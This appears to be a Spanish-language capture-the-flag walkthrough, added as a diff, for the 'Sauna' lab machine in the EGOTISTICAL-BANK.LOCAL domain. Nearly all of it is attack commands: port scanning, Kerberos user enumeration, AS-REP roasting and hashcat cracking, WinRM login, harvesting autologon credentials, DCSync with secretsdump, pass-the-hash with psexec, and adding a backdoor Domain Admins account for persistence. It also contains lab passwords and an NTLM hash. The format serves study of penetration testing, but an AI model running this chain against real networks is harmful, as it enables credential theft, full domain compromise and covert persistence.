@@ -1,0 +1,155 @@
+##escaneo de puertos : 1 minuto
+
+nmap -Pn -n --max-retries=0 --min-rate 2000 --open -p- -iL alcance.txt |grep -v "Not shown"| grep 'tcp' |cut -d '/' -f 1 | tr '\n' ',' >> ports_openn.txt
+
+pagina para detallar explicacion de comandos: https://explainshell.com/
+
+-n :  Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds
+--max-retires 0 : to prevent any retransmissions.
+--min-rate 2000: --min-rate 2000 means that Nmap will try to keep the sending rate at or above 2000 packets per second.
+--open: solo mostrar puertos abiertos.
+-p- :escane desde el puerto 1 al 65536. (todos los puertos).
+-iL : escanea el contenido del archivo alcance.txt (especificar ruta del archivo).
+grep -v  "Not shown": sacame todas las lineas que no digan "Not shown".
+grep tcp : sacame las lineas que digan tcp.
+cut -d '/' -f 1: solo sacame de cada linea el primer elemento , delimitado por el caracter "/".
+tr '\n' ',': sustituyeme el salto de lina por una coma.
+
+##escaneo de servicios : 2 minutos
+
+export ALLPORTS=$(cat ports_open.txt |tr '\n' ',' )
+nmap -Pn -n -sV -sC -p $ALLPORTS -iL alcance.txt > tcp_scan_services.txt
+
+#agregar el nombre del dominio y servidor al /etc/hosts
+
+sudo echo "10.129.181.33   sauna sauna.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL" >> /etc/hosts
+
+#chequear la pagina web en el puerto 80, identificar posibles usuarios.
+
+sudo dirsearch  -u http://10.129.181.33 --exclude-status=100-199,301,303-399,400-499,500-599 
+
+
+Fergus Smith
+Shaun Coins 
+Sophie Driver
+Bowie Taylor
+Hugo Bear
+Steven Kerb 
+Administrator
+
+#enumeramos directorios a ver si vemos algo interesante.
+
+sudo dirsearch  -u http://10.129.181.33 --exclude-status=100-199,301,303-399,400-499,500-599 
+
+#resultado
+[23:22:49] 200 -   30KB - /about.html                                       
+[23:23:15] 200 -   15KB - /contact.html                                     
+[23:23:31] 200 -   32KB - /index.html  
+
+
+#crear nomeclanturas de nombres de usuarios (https://github.com/urbanadventurer/username-anarchy#username-anarchy)
+
+./username-anarchy -i posible_users.txt >>  posiblekerberosusernames.txt
+
+
+#ahora usaremos la herramienta de kerbrute para enumerar usuarios validos con los posibles nombres que ya creamos. (https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
+ 
+
+./kerbrute_linux_amd64 userenum --dc 10.129.181.33 -d EGOTISTICAL-BANK.LOCAL posiblekerberosusernames.txt  >> kerberosusers.txt
+cat kerberosusers.txt | grep [+] | cut -d " " -f 8 | cut -d '@' -f 1 >>get_SPN_users.txt
+
+
+#ahora que tenemos los usuarios validos,nos vamos con el puerto 88 de Kerberos.
+#procedemos a realizar el ataque “AS-REP Roasting” donde se necesita el parámetro “pre-authentication” en un usuario de Active Directory como disabled,si es el caso, podemos solicitar datos de autenticación para cualquiera de estos usuarios y
+#el DC devolvería un mensaje AS-REP. Dado que parte de ese mensaje está encriptado con la contraseña del usuario, el atacante puede intentar forzar la contraseña del usuario fuera de línea.
+
+
+#solicitamos esa porcion encriptada con una herramienta de impacket.
+
+python /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile kerberosusers.txt -dc-ip 10.129.181.33 -format hashcat -outputfile usersTGT.txt
+
+#ahora intentamos crackearlo con la herramienta hashcat y la lista de rockyou.txt
+
+hashcat -m 18200 usersTGT.txt /usr/share/wordlists/rockyou.txt 
+hashcat -m 18200 usersTGT.txt /usr/share/wordlists/rockyou.txt --show >> crackhashpasswords.txt
+
+#confirmamos acceso por SMB (No tenemos).
+
+crackmapexec smb 10.129.181.33 -u fsmith -p Thestrokes23
+
+#confirmamos acceso por winrm , recuerden que vimos dichos puertos abiertos en el escaneo de nmap(si tenemos).
+
+crackmapexec winrm 10.129.181.33 -u fsmith -p Thestrokes23
+
+#nos conectamos por winrm a la maquina con las credenciales obtenidas.
+
+evil-winrm -i 10.129.181.33 -u fsmith -p Thestrokes23
+
+##PRIVILEGE ESCALATION
+
+#descargamos winpeas para windows para enumerar mas rapido (https://github.com/carlospolop/PEASS-ng/releases),
+#con esto veremos mas adelante que se tiene configurado un inicio de sesión en automático en la maquina,con el usuario llamado svc_loanmanager del dominio con la clave “Moneymakestheworldgoround!”.
+
+#upload winPEASany.exe
+
+./winPEASany.exe >> outputwinpeas.txt
+
+#si no usaramos winpeas , hay una forma manual de ver esto, consultando las llaves de registro de windows.
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+#probemos credenciales
+
+crackmapexec smb 10.129.181.33 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!’
+
+#vemos que no funciona , asi que vemos los usuarios de la maquina 
+
+net user 
+
+#vemos un usuario que tiene el nombre de svc_loanmgr, como si le cambiaron el nombre.
+
+crackmapexec smb 10.129.181.33 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!’
+
+#enumeramos el dominio
+bloodhound-python -ns 10.129.181.33 -d EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p Moneymakestheworldgoround!  -c All
+
+#encendemos bloodhound y neo4j en el kali (instalado por defecto o con un sudo apt-get xxxx se resuelve).
+
+sudo neo4j console
+bloodhound
+
+nota:la primera vez tienes que ir a la direccion de localhost de neo4j, usuario "neo4j" , pass "neo4j", te pide cambiar la clave, cuando la cambies , esa clave insertas en bloodhound.
+
+#usamos este query en bloodhound
+
+MATCH p = allshortestPaths((n)-[*1..]->(c)) 
+WHERE n.name =~ '(?i)svc_loanmgr.*' AND NOT c=n 
+RETURN p
+
+#descubrimos que svc_loanmgr tiene privilegios de dcsync sobre el dc , asi que realizamos un dcsync para capturar todos los hashes
+
+python /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.129.181.33 EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.181.33
+
+#nos conectamos como admin local
+python /usr/share/doc/python3-impacket/examples/psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.181.33 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+
+
+#por diversion creamos una persistencia local
+
+net user badbunny hola123! /domain /add
+net localgroup administrators badbunny /add
+
+#lo agregamos al grupo de domainadmin
+net group "Domain Admins" badbunny /ADD /DOMAIN
+
+
+#iniciamos sesion como bad bunny !
+python /usr/share/doc/python3-impacket/examples/wmiexec.py EGOTISTICAL-BANK.LOCAL/badbunny:'hola123!'@10.129.181.33
+
+
+#Referencias para posterior lectura
+
+leer diferencias entre psexec , wmiexec y smbexec >> https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986
+Detalle sobre ataque AS-rep roasting >> https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/
+as-rep roasting vs kerberoasting >> https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec#:~:text=Kerberoast%20has%20AS%2DREQ%2FAS,requesting%20a%20Kerberos%20Authentication%20Ticket.
+
